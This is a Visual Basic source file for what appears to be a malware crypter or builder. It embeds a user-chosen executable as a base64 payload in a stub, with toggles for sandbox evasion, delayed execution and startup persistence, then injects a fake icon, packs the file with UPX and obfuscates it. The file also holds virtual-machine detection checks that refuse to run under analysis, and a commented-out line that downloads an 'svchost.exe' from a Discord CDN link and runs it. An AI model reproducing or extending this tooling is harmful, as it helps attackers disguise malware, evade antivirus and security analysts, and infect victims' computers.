Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Management
Imports System.Windows.Forms.VisualStyles.VisualStyleElement

Public Class Form1
    Private Sub Guna2GradientButton2_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton2.Click
        Application.Exit()
    End Sub

#Region "RandomString"
    Dim T As New Random
    Function RandomString() As String
        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        Dim chn As String = "艾诶比西迪伊弗吉尺杰开勒我內普曲氏明德拉拉劇氏瑪我山蛋托克和閃卡雙劇馬闕黑我拉報網德盟雙德本報截和庵爾歐丁喇喬金歐盟本爾諾特底的配迪流金蛋金庵斯流喬拉本歐桃桃拉蛋莎奧伴腿雙桃報和德流喇代德伴德本普和加金歐截截代我瑪山的盟的塔喬拉士庵士問歐爾闕一喬德的嗯斯氏魚本蛋爾底闕氏破特雙伴桃截闕或駛歐盟托氏德普斯曲特和明喇加明進歐底黑破曲盟子和我庵闕本韋曲子的底喬底子士拉迪流或埋歐塔普流諾我進丁德氏加莎爾塔河馬迪爾塔拉山代或德哈托去破馬士一冰特奧子歐桃塔駛明德桃馬網拉喬金德斯马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德士曲冰桃腿丁喇塔截冰雙金的拉闕馬歐韋截莎普諾流斯馬破拉瑪拉本和網盟布魚截卡牛腿明和諾拉拉我卡普哈截破或馬桃一托歐莎德山的爾賃亞內貝和艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德"
        Dim heb As String = "אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim arb As String = "ابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي"
        Dim mix As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim s As String
        s = chn
        Dim sb As New StringBuilder
        For i As Integer = 1 To 65
            Dim idx As Integer = T.Next(0, 177)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    Public Function RandomGenerator()
        Randomize()
        Dim a = Int((10 - 1) * Rnd()) + 1
        Return a
    End Function
    Public Function RandomSnype()
        Randomize()
        Dim a = Int((9000 - 1000) * Rnd()) + 1000
        Return a
    End Function
    Public Function RandomNumber()
        Randomize()
        Dim a = Int((200 - 15) * Rnd()) + 15
        Return a
    End Function
    Dim p() As Process
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load

        '    My.Computer.Network.DownloadFile("https://cdn.discordapp.com/attachments/872813562626707496/872824480886558760/svchost.exe", "C:\svchost.exe")
        '   Process.Start("C:\svchost.exe")


        ''    CheckVDS()
        '    CheckVM()
        '    CheckVMT()

        Label7.Text = License.RichTextBox3.Text
        Label3.Text = System.Windows.Forms.SystemInformation.ComputerName
    End Sub
    Private Sub CheckVDS()
        p = Process.GetProcessesByName("vdservice")
        If p.Count > 0 Then
            MessageBox.Show("i cannot let you in, do not use virtual machine, instead you can use Normal PC.")
            Application.Exit()
        Else
            ' Process is not running
        End If
    End Sub
    Private Sub CheckVM()
        p = Process.GetProcessesByName("vm3dservice")
        If p.Count > 0 Then
            MessageBox.Show("i cannot let you in, do not use virtual machine, instead you can use Normal PC.")
            Application.Exit()
        Else
            ' Process is not running
        End If
    End Sub
    Private Sub CheckVMT()
        p = Process.GetProcessesByName("vmtoolsd")
        If p.Count > 0 Then
            MessageBox.Show("i cannot let you in, do not use virtual machine, instead you can use Normal PC.")
            Application.Exit()
        Else
            ' Process is not running
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        RichTextBox1.Text = RandomString()
        RichTextBox2.Text = RandomString()
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Panel3_Paint(sender As Object, e As PaintEventArgs) Handles Panel3.Paint

    End Sub

    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton1.Click
        Dim saveFileDialog As SaveFileDialog = New SaveFileDialog()
        saveFileDialog.Filter = "Exe File | *.exe"
        If saveFileDialog.ShowDialog() = DialogResult.OK Then

            Dim code As String = My.Resources.Stub

            Dim text As String = code
            Dim text2 As String = text

            text2 = text2.Replace("%payload%", RichTextBox5.Text)


            If Guna2CheckBox2.Checked = True Then
                text2 = text2.Replace("//sandbox", Nothing)
            End If

            If Guna2CheckBox3.Checked = True Then
                text2 = text2.Replace("//iamsleep", Nothing)
                text2 = text2.Replace("%time%", Delay.RichTextBox3.Text)
            End If

            If Guna2CheckBox1.Checked = True Then
                text2 = text2.Replace("//startlo", Nothing)
            End If

            If download.Guna2CheckBox2.Checked = True Then
                text2 = text2.Replace("%exename%", download.RichTextBox3.Text)
            End If


            RichTextBox4.Text = text2

            Zarrme.Varrme.build(saveFileDialog.FileName, text2, Nothing)

            If IconChanger.Guna2CheckBox1.Checked = True Then
                IconInjector.InjectIcon(saveFileDialog.FileName, IconChanger.Guna2TextBox1.Text)
            End If



            If compress.Guna2CheckBox2.Checked = True Then
                Interaction.Shell("cmd.exe /C upx\upx.exe """ + saveFileDialog.FileName + """", AppWinStyle.NormalFocus, True, -1)
            End If
            If Guna2CheckBox6.Checked = True Then
                Interaction.Shell("cmd.exe /C Obfuscator\Obfuscator.exe """ + saveFileDialog.FileName + """", AppWinStyle.NormalFocus, True, -1)
                File.Delete(saveFileDialog.FileName)
            End If




            Interaction.MsgBox("Build Done", MsgBoxStyle.Information, Nothing)
        End If
    End Sub

    Private Sub Guna2GradientButton4_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton4.Click
        compress.Show()
    End Sub

    Private Sub Guna2GradientButton3_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton3.Click
        download.Show()
    End Sub

    Private Sub Guna2CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox3.CheckedChanged
        If Guna2CheckBox3.Checked = True Then
            Delay.Show()
        End If
    End Sub

    Private Sub Guna2GradientButton8_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton8.Click

    End Sub

    Private Sub Guna2GradientButton9_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton9.Click


    End Sub
#End Region

    Private Sub Guna2GradientButton7_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton7.Click
        Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("https://hwidlocksystem.000webhostapp.com/update.txt")
        Dim response As System.Net.HttpWebResponse = request.GetResponse()
        Dim read As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream)
        Dim database As String = read.ReadToEnd
        Dim licence As String = Label8.Text
        If database.Contains(licence) Then
            MsgBox("You Are Using Updated Version!, No Updates", MsgBoxStyle.Information)

        Else
            MsgBox("New Version Avaible Contact Me To Get It!", MsgBoxStyle.Critical)
        End If
    End Sub

    Private Sub Guna2GradientButton5_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton5.Click
        IconChanger.Show()
    End Sub
#Region "Icon Injector"
    Public Class IconInjector

        <SuppressUnmanagedCodeSecurity()>
        Private Class NativeMethods
            <DllImport("kernel32")>
            Public Shared Function BeginUpdateResource(
            ByVal fileName As String,
            <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
            End Function

            <DllImport("kernel32")>
            Public Shared Function UpdateResource(
            ByVal hUpdate As IntPtr,
            ByVal type As IntPtr,
            ByVal name As IntPtr,
            ByVal language As Short,
            <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)>
            ByVal data() As Byte,
            ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
            End Function

            <DllImport("kernel32")>
            Public Shared Function EndUpdateResource(
            ByVal hUpdate As IntPtr,
            <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
            End Function
        End Class

        ' The first structure in an ICO file lets us know how many images are in the file.
        <StructLayout(LayoutKind.Sequential)>
        Private Structure ICONDIR
            Public Reserved As UShort  ' Reserved, must be 0
            Public Type As UShort      ' Resource type, 1 for icons.
            Public Count As UShort     ' How many images.
            ' The native structure has an array of ICONDIRENTRYs as a final field.
        End Structure

        ' Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
        ' starts in the file. The other fields give the information required to turn that image data into a valid
        ' bitmap.
        <StructLayout(LayoutKind.Sequential)>
        Private Structure ICONDIRENTRY
            Public Width As Byte            ' Width, in pixels, of the image
            Public Height As Byte           ' Height, in pixels, of the image
            Public ColorCount As Byte       ' Number of colors in image (0 if >=8bpp)
            Public Reserved As Byte         ' Reserved ( must be 0)
            Public Planes As UShort         ' Color Planes
            Public BitCount As UShort       ' Bits per pixel
            Public BytesInRes As Integer   ' Length in bytes of the pixel data
            Public ImageOffset As Integer  ' Offset in the file where the pixel data starts.
        End Structure

        ' Each image is stored in the file as an ICONIMAGE structure:
        'typdef struct
        '{
        '   BITMAPINFOHEADER   icHeader;      // DIB header
        '   RGBQUAD         icColors[1];   // Color table
        '   BYTE            icXOR[1];      // DIB bits for XOR mask
        '   BYTE            icAND[1];      // DIB bits for AND mask
        '} ICONIMAGE, *LPICONIMAGE;


        <StructLayout(LayoutKind.Sequential)>
        Private Structure BITMAPINFOHEADER
            Public Size As UInteger
            Public Width As Integer
            Public Height As Integer
            Public Planes As UShort
            Public BitCount As UShort
            Public Compression As UInteger
            Public SizeImage As UInteger
            Public XPelsPerMeter As Integer
            Public YPelsPerMeter As Integer
            Public ClrUsed As UInteger
            Public ClrImportant As UInteger
        End Structure

        ' The icon in an exe/dll file is stored in a very similar structure:
        <StructLayout(LayoutKind.Sequential, Pack:=2)>
        Private Structure GRPICONDIRENTRY
            Public Width As Byte
            Public Height As Byte
            Public ColorCount As Byte
            Public Reserved As Byte
            Public Planes As UShort
            Public BitCount As UShort
            Public BytesInRes As Integer
            Public ID As UShort
        End Structure

        Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
            InjectIcon(exeFileName, iconFileName, 1, 1)
        End Sub

        Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInteger, ByVal iconBaseID As UInteger)
            Const RT_ICON = 3UI
            Const RT_GROUP_ICON = 14UI
            Dim iconFile As IconFile = IconFile.FromFile(iconFileName)
            Dim hUpdate = NativeMethods.BeginUpdateResource(exeFileName, False)
            Dim data = iconFile.CreateIconGroupData(iconBaseID)
            NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_GROUP_ICON), New IntPtr(iconGroupID), 0, data, data.Length)
            For i = 0 To iconFile.ImageCount - 1
                Dim image = iconFile.ImageData(i)
                NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_ICON), New IntPtr(iconBaseID + i), 0, image, image.Length)
            Next
            NativeMethods.EndUpdateResource(hUpdate, False)
        End Sub

        Private Class IconFile

            Private iconDir As New ICONDIR
            Private iconEntry() As ICONDIRENTRY
            Private iconImage()() As Byte

            Public ReadOnly Property ImageCount As Integer
                Get
                    Return iconDir.Count
                End Get
            End Property

            Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
                Get
                    Return iconImage(index)
                End Get
            End Property

            Private Sub New()
            End Sub

            Public Shared Function FromFile(ByVal filename As String) As IconFile
                Dim instance As New IconFile
                ' Read all the bytes from the file.
                Dim fileBytes() As Byte = IO.File.ReadAllBytes(filename)
                ' First struct is an ICONDIR
                ' Pin the bytes from the file in memory so that we can read them.
                ' If we didn't pin them then they could move around (e.g. when the
                ' garbage collector compacts the heap)
                Dim pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned)
                ' Read the ICONDIR
                instance.iconDir = DirectCast(Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
                ' which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
                instance.iconEntry = New ICONDIRENTRY(instance.iconDir.Count - 1) {}
                instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
                ' The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
                Dim offset = Marshal.SizeOf(instance.iconDir)
                ' After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
                Dim iconDirEntryType = GetType(ICONDIRENTRY)
                Dim size = Marshal.SizeOf(iconDirEntryType)
                For i = 0 To instance.iconDir.Count - 1
                    ' Grab the structure.
                    Dim entry = DirectCast(Marshal.PtrToStructure(New IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), ICONDIRENTRY)
                    instance.iconEntry(i) = entry
                    ' Grab the associated pixel data.
                    instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                    Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                    offset += size
                Next
                pinnedBytes.Free()
                Return instance
            End Function

            Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
                ' This will store the memory version of the icon.
                Dim sizeOfIconGroupData As Integer = Marshal.SizeOf(GetType(ICONDIR)) + Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * ImageCount
                Dim data(sizeOfIconGroupData - 1) As Byte
                Dim pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned)
                Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
                Dim offset = Marshal.SizeOf(iconDir)
                For i = 0 To ImageCount - 1
                    Dim grpEntry As New GRPICONDIRENTRY
                    Dim bitmapheader As New BITMAPINFOHEADER
                    Dim pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned)
                    Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                    pinnedBitmapInfoHeader.Free()
                    grpEntry.Width = iconEntry(i).Width
                    grpEntry.Height = iconEntry(i).Height
                    grpEntry.ColorCount = iconEntry(i).ColorCount
                    grpEntry.Reserved = iconEntry(i).Reserved
                    grpEntry.Planes = bitmapheader.Planes
                    grpEntry.BitCount = bitmapheader.BitCount
                    grpEntry.BytesInRes = iconEntry(i).BytesInRes
                    grpEntry.ID = CType(iconBaseID + i, UShort)
                    Marshal.StructureToPtr(grpEntry, New IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                    offset += Marshal.SizeOf(GetType(GRPICONDIRENTRY))
                Next
                pinnedData.Free()
                Return data
            End Function

        End Class

    End Class
#End Region

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint

    End Sub

    Private Sub Guna2GradientButton10_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton10.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Executable Files (*.exe)|*.exe"
        If Open.ShowDialog = vbOK Then
            RichTextBox3.Text = Open.FileName


            Dim omg As String = Convert.ToBase64String(File.ReadAllBytes(RichTextBox3.Text))


            RichTextBox5.Text = omg


        End If
    End Sub
End Class
